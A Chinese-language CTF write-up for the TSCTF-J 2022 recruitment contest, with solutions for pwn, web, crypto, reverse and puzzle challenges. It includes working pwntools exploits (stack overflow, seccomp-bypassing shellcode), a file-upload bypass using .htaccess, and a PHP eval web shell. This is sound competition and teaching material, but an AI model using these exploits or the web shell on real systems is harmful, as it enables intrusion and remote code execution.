---
title: tsctf-j2022 wp——天璇merak招新赛
---

​        从moe到tsctf-j，算是有一些些微薄的长进。

## pwn

### 世界

- 思路
  
  前期刷分，后期用分数换技能，（当然是选择下辈子不要WAIFU辣）。注意到有read函数可以输入，且程序没开pie，并且给了goddess_backdoor函数，由此猜测栈溢出。

- size_t 变量类型
  
  read前会检查输入的大小，49不够溢出，但是nbytes的变量类型是size_t，size_t被解析位无符号数，然而在和49比较的时候是以int格式的，即有符号数。因此输入size一个负数即可。
  
  ```c
  size_t nbytes; // [esp+0h] [ebp-4Ch] BYREF
  
  puts("Your skill length: ");
  __isoc99_scanf("%d", &nbytes);
  if ( (int)nbytes > 49 )
  {
  puts("Too long!");
  exit(1);
  }
  puts("ENTER YOUR SKILL: ");
  result = read(0, buf, nbytes);
  break;
  ```

- exp
  
  ```python
  from pwn import *
  
  context(os='linux',arch='x86',log_level='debug')
  content = 0
  
  if content == 1:
      giacomo = process('./pwn')
  else:
      giacomo = remote("10.21.162.184", 6657)
  
  def main():
      # gdb.attach(giacomo, 'b* 0x8049780')
      # pause()
      backdoor = 0x804984A
      for i in range(201):
          giacomo.recvuntil(b'Choice: > ')
          giacomo.sendline(b'5')
      giacomo.sendlineafter(b'Choice: > ',b'0')
      giacomo.sendlineafter(b'Choice: > ',b'6')
  
      giacomo.sendlineafter(b'Your skill length: \n', b'-49')
      payload = b'a'*0x4b + p32(backdoor)
      giacomo.sendafter(b'ENTER YOUR SKILL: \n',payload)
  
      giacomo.interactive()
  main()
  ```

### checkin

- exp
  
  ```python
  from pwn import *
  
  context(os='linux',arch='amd64',log_level='debug')
  content = 0
  
  if content == 1:
      giacomo = process('./checkin')
  else:
      giacomo = remote("10.21.162.184", 6661)
  
  def main():
      # gdb.attach(giacomo)
      # pause()
      giacomo.sendafter(b'==> BBBBBBBB\n',b'a'*0x21+b'BUPTBUPT')
      giacomo.interactive()
  main()
  ```

### ret2shellcode

- 沙箱&ORW
  
  （本来以为是普通的execve bin sh，直到报错bad syscall，才意识到被ban了。）这里使用了seccomp的沙箱机制，可以用seccomp-tools查看。
  
  ```bash
  giacomo@ubuntu:~/Desktop/tsctf-j$ seccomp-tools dump ./ret2shellcode
   line  CODE  JT   JF      K
  =================================
   0000: 0x20 0x00 0x00 0x00000000  A = sys_number
   0001: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0003
   0002: 0x06 0x00 0x00 0x00000000  return KILL
   0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW
  ```
  
  execve被禁用，还可以ROW绕过，读取flag文件写入栈并输出。

- exp
  
  ```PYTHON
  from pwn import *
  
  context(os='linux',arch='amd64',log_level='debug')
  content = 0
  
  if content == 1:
      giacomo = process('./ret2shellcode')
  else:
      giacomo = remote("10.21.162.184", 6660)
  
  def main():
      # gdb.attach(giacomo)
      # pause()
  
      readshellcode ='''
      mov rdi,0;  #标准输入
      mov rsi,0x23301e;#地址
      mov rdx,0x1000;#大小
      mov rax,0;#0号也就是read调用
      syscall;
  
      ''' 
      readshellcode = asm(readshellcode)
      giacomo.sendafter(b'Please write your letter:\n', readshellcode)
      payload = b'a'*0x38 +p64(0x233000)
      giacomo.sendafter(b'OK,I will pass it on for you!\n',payload)
  
      open_flag = '''
      push   0x67616c66
      push   0x2
      pop    rax
      mov    rdi,rsp
      xor    rsi,rsi
      syscall 
      '''
  
      read_flag ='''
      mov    rdi,rax
      xor    rax,rax
      mov    rsi,rsp
      push   0x20
      pop    rdx
      syscall 
      '''
      output_flag ='''
      push   0x1
      pop    rax
      push   0x1
      pop    rdi
      mov    rsi,rsp
      push   0x20
      pop    rdx
      syscall
      '''
      shellcode = asm(open_flag + read_flag + output_flag)
  
      giacomo.send(shellcode)
      giacomo.recvuntil(b'TSCTF')
      flag = giacomo.recv()
      print(flag)
  main()
  ```

### ascii

- 随机可爱pics是这么出现的
  
  ```c
    fd = open("/dev/urandom", 0);   //读取/dev/urandom获取随机数
    read(fd, &buf, 4uLL);
    return 2333 * buf % a1;        //        随机数模4
  ```
  
  ida里看函数依次为
  
  ```bash
  main
  rand
  binsh
  pic1
  pic2
  pic3
  pic4
  ```

​        输入完成后函数随机调用4个pic的其中一个，pic1和binsh地址除了后两位都是一样的，用p8()覆盖地址的后2位就有机会（1/4）        binsh。

- exp
  
  忘存了呜呜

### sc

- 程序大致流程
  
    程序申请了两个0x1000的内存（不知道是什么原理，这两个内存的地址差值在同一设备上固定，但是不同设备不是。我从ubantu18换到20才发现。）前一个内存里是flag，后一个内存被写入如下数据：
  
  ```bash
  0x7ffff7ff6000:    0x3148f63148ff3148    0x48c93148d23148d2
  0x7ffff7ff6010:    0xc0314ddb3148c031    0x314dd2314dc9314d
  0x7ffff7ff6020:    0x48ed314de4314ddb    0x        ed3148e431
  ```
  
    即如下汇编，用来清空寄存器。
  
  ```bash
  0x7ffff7ff6000    xor    rdi, rdi
  0x7ffff7ff6003    xor    rsi, rsi
  0x7ffff7ff6006    xor    rdx, rdx
  0x7ffff7ff6009    xor    rdx, rdx
  0x7ffff7ff600c    xor    rcx, rcx
  0x7ffff7ff600f    xor    rax, rax
  0x7ffff7ff6012    xor    rbx, rbx
  0x7ffff7ff6015    xor    r8, r8
  0x7ffff7ff6018    xor    r9, r9
  0x7ffff7ff601b    xor    r10, r10
  0x7ffff7ff601e    xor    r11, r11
  ```
  
    输入的位置在二进制代码之后，完成输入之后，程序跳转到第二片内存区域执行清空寄存器指令。
  
  ```bash
  mov     rax, [rbp+var_8]
  call    rax
  ```
  
    总的来说就是输入一段shellcode，在清空寄存器后执行shellcode。

- 沙箱
  
  ```bash
  giacomo@ubuntu:~/Desktop/tsctf-j$ seccomp-tools dump ./sc
   line  CODE  JT   JF      K
  =================================
   0000: 0x20 0x00 0x00 0x00000004  A = arch
   0001: 0x15 0x00 0x14 0xc000003e  if (A != ARCH_X86_64) goto 0022
   0002: 0x20 0x00 0x00 0x00000000  A = sys_number
   0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005
   0004: 0x20 0x00 0x00 0x00000000  A = sys_number
   0005: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0007
   0006: 0x20 0x00 0x00 0x00000000  A = sys_number
   0007: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0009
   0008: 0x20 0x00 0x00 0x00000000  A = sys_number
   0009: 0x15 0x00 0x01 0x00000005  if (A != fstat) goto 0011
   0010: 0x20 0x00 0x00 0x00000000  A = sys_number
   0011: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0013
   0012: 0x20 0x00 0x00 0x00000000  A = sys_number
   0013: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0015
   0014: 0x20 0x00 0x00 0x00000000  A = sys_number
   0015: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0017
   0016: 0x20 0x00 0x00 0x00000000  A = sys_number
   0017: 0x15 0x00 0x01 0x00000025  if (A != alarm) goto 0019
   0018: 0x20 0x00 0x00 0x00000000  A = sys_number
   0019: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0021
   0020: 0x20 0x00 0x00 0x00000000  A = sys_number
   0021: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0023
   0022: 0x06 0x00 0x00 0x00000000  return KILL
   0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
  ```
  
    不仅不能调用exevce，也禁用了read，write，open，openat。那就只能找其它的syscall来读flag了。syscall table里有一个writev，将分散的数据块写入多个连续区域，不过writev需要结构体iovec，用来表明数据块的地址和大小。所以在使用writev之前不仅要找到flag地址，还要在内存里写指针和输出的大小。
  
  ```c
  writev(int fd, struct iovect* iov, int iovcnt);
  
  struct iovec {
      void* iov_base;
      size_t iov_len;
  };
  ```

- 确定两块内存的地址
  
  虽然寄存器被清空，但是留下了一个rip。rip指令能用lea指令读取，如`lea rbp, [rip]`，这样就得到了第二片内存块的地址。
  
  在本地两篇内存块的偏移是固定的，所以至少能在本地得到前一块内存的地址。不过远程就不一样了，只好依次加0x1000找flag，刚好"TSCTF-J{"是八个字节，比较好找。（我本来想挨个把偏移试一遍，但出题人觉得不够优雅，于是提醒我不妨搜索一下）。
  
  ```python
      get_addr = '''
      lea rbx, [rip]
      mov rsp, rbx
      add rsp, 0x100
      sub rbx, 0x34    
      mov r14, 0x7b4a2d4654435354            #TSCTF-J{
  nomatch:  
      add rbx, 0x1000
      mov rcx, [rbx]                
      cmp rcx, r14                        #比较内存里的值是不是TSCTF-{
      je match;                            #找到了flag
      jne nomatch;                        #没找到，rbx继续加0x1000寻找
  match:
      mov rcx, rbx
      mov r10, rbx
      add r10, 0x40
  ```

- 构造iovec结构体
  
  使用mov指令将数据写入指定内存块即可。（这里想了超级超级久hhh甚至找了奇奇怪怪的syscall，败在不熟悉汇编语言了，前面的lea也是）

- 标准输出被关闭
  
  悄悄在沙箱函数最后一行关闭了标准输出，所以在调试的时候syscall的调用如下所示，若标准输出没有关闭，fd应该会指向/dev/pts/n才对。
  
  ```bash
  ► 0x7f6e069aa09f    syscall  <SYS_writev>
      fd: 0x1                 //应该要/dev/pts/n才对
      iovec: 0x7f6e069ab040 —▸ 0x7f6e069ab000 ◂— 'TSCTF_J{1111111111}\n'
      count: 0x1
  ```
  
  这里用标准错误输出即可。
  
  ```bash
   ► 0x7f588ca8c09f    syscall  <SYS_writev>
       fd: 0x2 (/dev/pts/1)
       iovec: 0x7f588ca8d040 —▸ 0x7f588ca8d000 ◂— 'TSCTF_J{1111111111}\n'
       count: 0x1
  ```

- exp
  
  ```python
  from pwn import *
  
  context(os='linux',arch='amd64',log_level='debug')
  content = 0
  
  if content == 1:
      giacomo = process('./sc1')
  else:
      giacomo = remote("64.27.6.187", 9999)
      def main():
      # gdb.attach(giacomo)
      # pause()
      get_addr = '''
      lea rbx, [rip]
      mov rsp, rbx
      add rsp, 0x100
      sub rbx, 0x34    
      mov r14, 0x7b4a2d4654435354
  nomatch:  
      add rbx, 0x1000
      mov rcx, [rbx]
      cmp rcx, r14
      je match;
      jne nomatch;
  match:
      mov rcx, rbx
      mov r10, rbx
      add r10, 0x40
      '''
  
      move_data='''
      mov rbp, r10
      sub rbp, 0x8
      mov 0x8[rbp], rbx
      add rbp, 0x8
      mov r12, 0x1f
      mov 0x8[rbp], r12
      '''
  
      get_flag = '''
      mov rax, 0x14
      mov rsi, r10
      mov rdi, 0x2
      mov rdx, 0x1
      syscall
      '''
      payload = asm(get_addr)
      payload += asm(move_data)
      payload += asm(get_flag)
      giacomo.send(payload)
      flag=giacomo.recv()
      print(flag)
  
  main()
  ```

## web

### 词超人

- 用en标签里的英文答案作为answerarray上传
  
  ```js
  function uncover(button){
      button.parentNode.getElementsByClassName('en')[0].style.visibility=
          button.parentNode.getElementsByClassName('en')[0].style.visibility=="hidden"?
          "visible":
      "hidden"
  }
  function submit(){
      const answerArray=[];
      let divArray=document.getElementsByClassName('chunk')
      for(div of divArray){
          //在这里修改
          answerArray.push({id:div.id,answer:div.getElementsByClassName('en')[0].innerHTML})  
      }
      const xhr = new XMLHttpRequest();
      const url = "/submit";
      xhr.open("POST", url, true);
      xhr.setRequestHeader("Content-Type", "application/json");
      xhr.onreadystatechange = function () {
          if (xhr.readyState === 4 && xhr.status === 200) {
              alert(xhr.responseText)
          }
      };
      xhr.send(JSON.stringify(answerArray));
  }
  ```
  
  （关于我不知道在控制台改js，在元素那里想了很久这件事）

### onlyimg

- 文件上传地址
  
  ```php
  $msg="Upload Success ! Your file name is : %s";
  foreach($fileinfo as $key => $value)
  {
      $msg = sprintf($msg, $value);      //用fileinfo的值替换msg里的%s
  }
  echo $msg;
  echo "<br>But I don't know where it stores......";
  ```
  
  将上传的文件命名成%s就可以得到地址了

- 后缀名绕过
  
  把php命名为jpg
  
  ```python
  import requests
  
  url = 'http://39.107.138.71:8080/upload.php'
  files = {'file': ('%s.jpg', open('a.php', 'rb'))} 
  response = requests.post(url, files=files)
  text = response.text
  print(text)
  ```
  
  上传.htaccess文件修改配置信息，把.jpg解析成php
  
  ```bash
  <FilesMatch ".jpg">
      SetHandler application/x-httpd-php
  </FilesMatch>
  ```

- php标签绕过
  
  ```php
  <?=@eval($_POST['a']);?>
  ```

### 真真

- JSFUCK

### 错过了学姐奶茶的寒秋送温暖

- 脚本改文件类型
  
  ```python
  import requests
  
  url = 'http://120.53.241.93:10086/'
  files = {'file': ('a.php', open('a.php', 'rb'), 'image/jpg')
  response = requests.post(url, files=files)
  text = response.text
  print(text)
  ```
  
  （关于我差点忘记可以写python发请求这件事）

## crypto

### rsa

- flag1
    知道p、q的解密过程如下
  
  ```python
  d = gmpy2.invert(e,(p-1)*(q-1))
  n = p *q
  ```

- flag2
  
  p、q的值较小，直接分解[大数分解](http://www.factordb.com/index.php)

- flag3
  
  p、q值相近，用yafu来找相近的素数

- flag4
  
  乘方的次数太小不够取模，直接开方

- exp
  
  ```python
  from Crypto.Util.number import *
  from gmpy2 import *
  
  p = 126848068662434725837362927110508359670513097902158347608742478683379412542373205396355795471254038301102414856525121647188484976552142343067044591036870463204973197337043645689668460536955381260032883948287738855267140030987485450026217231376934834164731323791161242646800219869703713605170682364116602398481
  q = 108831434115512090318037589335170063989256445400295000303568098461799570376658935415095544400164386313684432766346946165811277996284801631673216470358009654117077854125122927553974223129029217160157869796055967783796164293604324171269850795257143703187899358858675646672321319018167474020363026585548820771697
  e = 65537
  c = 12806426835071949867711416962709958594314368469792264574105984900555439512183487926101898057954900183669492820478219013019317212504718045553210233002824678962092820191899047884098185828625477721152790480535997733511787559909800255732856472382084502459064555276405636335011653299264667296955585832665754137638936306114164795630686750776282273654483469063781121080308493239356585954141139584326117462247270605137016151223704623131634401478066683053816761883398796060573577823014077050991745590269109018594293646949390055766822956018083267147781811450534232319486801350308073725708881185484667042111239958769639753074974
  d = gmpy2.invert(e,(p-1)*(q-1))
  n = p *q
  m=powmod(c,d,n)
  m = long_to_bytes(m).decode()
  print(m)
  
  n = 117468512089531428663961257960238163911
  e = 65537
  c = 116661533228458434140621528983098975679
  p = 10044079891992334031
  q = 11695298459661145481
  d = gmpy2.invert(e,(p-1)*(q-1))
  n = p *q
  m=powmod(c,d,n)
  m = long_to_bytes(m).decode()
  print(m)
  
  q = 116157631074161326668152038927249334338399827206586914589176832177082944299227717473355044107614652079152523161147120835537353552449908708629934368874677505050900078018992526314964561246045453416854196152086105218778204572329269076361235953745958869643828443636138454981800813514293034142691705140488032060333
  p = 116157631074161326668152038927249334338399827206586914589176832177082944299227717473355044107614652079152523161147120835537353552449908708629934368874677505050900078018992526314964561246045453416854196152086105218778204572329269076361235953745958869643828443636138454981800813514293034142691705140488032064827
  n = 13492595256760969040679230352398486845474955975199604800660741616776625780411272813224167801996221854423950963429539941573997611430663873182935561614207154821126761724862959388136641380305863820357311556705058402764857971168891247598952474612658335721334501562320453135569072859647106595744699686106575394155623607871280406174889010332061295980615904318604783210190774745857252314015710989087615728493401949363616443440371076313467788459099129219583070179936217564350523405302532093137784337453902235992607281224617514376983703401850900613434289916680690958012167734859041293116971287070809385300950616506089031207391
  e = 65537
  c = 9556855627975459046740821834528544070427049621127160951742003478725424449033433009828717934730280978533743220944726870403563278379897696996593408941742726761954126312142544881536075456011232335038713394388844246035946642298588354835538957640121051986433171003548328013363624428388045689223434747553158248457199579326477645217581943607544640937724609291757178063476167129106555047385785925998650584941948353305651394629383203202173799027705269424908549510903196317581322985993424298619576745664607011471390391051884932663025002185768778902167735501719300645089512150938345539777564021221129832163135987500087303945958
  
  d = gmpy2.invert(e,(p-1)*(q-1))
  n = p *q
  m=powmod(c,d,n)
  m = long_to_bytes(m).decode()
  print(m)
  
  e = 7
  c = 24352183908812439486066187971806232095447207924326195067955513727448051350160252184726311366048048945796542616778567176778473328388848916602914602254361942853429047133399539108358587787495587158203125
  n = 16311936352179992492322678030084754707912920265012738488001035655568811201293057367042418918656434158566661057011011903060966139141261511970173395803273617809596669492853191556134593000727887389753473207671720940942296594391783348274481657029091989837730022520412600669905401644620228349730622930180575214015304207221073824165287677553936892684490958627884970712382480336987266790423306814756649897559941928884283783109014172545384266583536851269964790353704338665524956130951949158484613551769004309270737394403919413951880647112332734742309798941724190059029780419002154606451025683494409014840175366489059673990383
  
  m = gmpy2.iroot(c, e)
  m = 30464294894851269162823603325
  m = long_to_bytes(m).decode()
  print(m)
  ```

### nonograms

​        先写出开、得，结合hint，猜到是旗开得胜。

## ab

### abstract_culture_revenge

​      比较确定的是最后一个蘑菇应该是“君”（菌）。水晶球应该是“不”（卜），这两个是在古诗语境下比较常见的解释。于是猜测后三字应该是“不见君”，“不识君”。结合前文，得出flag。（虽然猜的很不容易，但总的来说这题好妙！）

### helang

- speak to saint he
  
  ```bash
  Speak to Saint He > u8 b = 1 | 2 | 3
  Speak to Saint He > u8 egg = 688333 * b[1]
  Speak to Saint He > print egg
  688333
  ```

## misc

### byr之声

​    倒放

## re

### byte_code

- 字节码简介
  
  汇编之于c语言，字节码之于python

- 硬逆字节码
  
  ```python
  a = [114,101,118,101,114,115,101,95,116,104,101,95,98,121,116,101]
  b = [99, 111,100,101,95,116,111,95,103,101,116,95,102,108,97,103]
  e = [80, 115, 193, 24, 226, 237, 202, 212, 126, 46, 205, 208, 215, 135, 228, 199, 63, 159, 117, 52, 254, 247, 0, 133, 163, 248, 47, 115, 109, 248, 236, 68]
  pos = [9, 6, 15, 10, 1, 0, 11, 7, 4, 12, 5, 3, 8, 2, 14, 13]
  d = [335833164, 1155265242, 627920619, 1951749419, 1931742276, 856821608, 489891514, 366025591, 1256805508, 1106091325, 128288025, 234430359, 314915121, 249627427, 207058976, 1573143998, 1443233295, 245654538, 1628003955, 220633541, 1412601456, 1029130440, 1556565611, 1644777223, 853364248, 58316711, 734735924, 1745226113, 1441619500, 1426836945, 500084794, 1534413607]
  
  if(__name__ == '__main__'):
      c = a+b          
      for i in range(31):
          print(chr(c[i]),end='')
      print(chr(c[31]))
      for i in range(16):
          a[i]=(a[i]+d[i])^b[pos[i]]
      for i in range(16):
          b[i]=b[i]^a[pos[i]] 
      c = a+b
      for i in range(32):
          c[i] = (c[i]*d[i])%256
          c[i]^=e[i]
          print(chr(c[i]),end='')
  ```
